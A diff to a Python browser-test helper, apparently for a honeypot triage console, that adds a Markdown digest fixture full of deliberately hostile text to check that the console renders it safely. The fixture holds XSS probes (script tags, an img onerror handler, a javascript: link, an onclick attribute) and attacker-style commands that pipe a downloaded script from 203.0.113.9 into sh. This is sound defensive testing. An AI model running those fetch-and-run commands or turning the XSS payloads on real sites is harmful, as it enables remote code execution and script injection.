@@ -69,3 +69,82 @@ def watch(page) -> Watched:
         f"{res.status} {res.request.method} {res.url}"))
     page.on("dialog", on_dialog)
     return seen
+
+
+# ---- a digest with every Markdown construct the console formats --------------------------
+
+DIGEST_DAY = "2026-01-15"
+DIGEST_RECORD = "session-00000000000000000000000000d16e57"
+DIGEST_SCRIPT = "<script>window.__winnie_xss = 'digest'</script>"
+DIGEST_IMG = "<img src=x onerror=\"window.__winnie_xss = 'digest-img'\">"
+DIGEST_LONG = "A" * 6000
+
+
+def digest_fixture() -> str:
+    """A digest in the writer's shape (agents/triage.py digest), with the constructs it never
+    writes and hostile text in code spans, plain text, link targets and table cells."""
+    rows = "\n".join(f"| 198.51.100.{n % 250} | ssh | {n} | `user{n}` | {n * 3} | ok |" for n in range(200))
+    nested = "\n".join("  " * depth + f"- level {depth + 1}" for depth in range(5))
+    return f"""# Honeypot digest {DIGEST_DAY}
+
+Records: 4 (2 SSH sessions, 2 campaigns). LLM-triaged: 3.
+Analyses reused: 1 (a stored model answer for a repeated command sequence, no model call).
+
+| Judgement | Count |
+|---|---|
+| MALICIOUS | 2 |
+| SUSPICIOUS | 1 |
+| BENIGN | 1 |
+
+## Top three needing attention
+
+1. MALICIOUS / EXECUTION / ssh from `198.51.100.7` (`{DIGEST_RECORD}`) **HONEYTOKEN USED**
+   - **`Downloader fetched and ran a **payload** <b>bold</b>`** (MALICIOUS)
+   - Who: `198.51.100.7, Example Net, NL`
+   - Volume: 1 session, 14 commands, 2 logins
+   - What they did
+     - `wget http://203.0.113.9/x.sh -O- | sh`
+     - `echo {DIGEST_SCRIPT}`
+   - Finding: `{DIGEST_IMG}`
+   - high-signal: `download_execute`x1
+2. SUSPICIOUS / DISCOVERY / ssh from `198.51.100.8` (`session-00000000000000000000000000000b0b`)
+   - `uname -a; cat /proc/cpuinfo \\| grep name`
+
+## Notes
+
+Plain *italic*, __bold__, _also italic_ and `code` with an escaped \\*star\\*.
+Open [the first record](#/records/{DIGEST_RECORD}), [the day before](#/digests/2026-01-14) or
+[the queue](#/queue). These stay text: [guide](https://example.com/guide),
+[run](javascript:window.__winnie_xss='link'), [bad route](#/records/<script>),
+![tracker](https://example.com/t.png) and <a href="#/" onclick="window.__winnie_xss='a'">a tag</a>.
+Entities stay as typed: &lt;b&gt; &amp; &#60;script&#62;.
+{DIGEST_SCRIPT}
+{DIGEST_IMG}
+
+> Quoted analyst note with `code` and **weight**.
+> > A nested quote.
+
+---
+
+```sh
+curl -s http://203.0.113.9/x.sh | sh
+<script>window.__winnie_xss = 'fence'</script>
+```
+
+Nested five deep:
+
+{nested}
+
+Long value: `{DIGEST_LONG}`
+
+## Sources
+
+| Source | Service | Sessions | User | Commands | State |
+|:---|:---:|---:|---|---:|---|
+{rows}
+
+### ftp
+- usernames: `admin` (3), `{DIGEST_SCRIPT}` (1)
+- passwords: `pass0` (1)
+- pairs: 
+"""
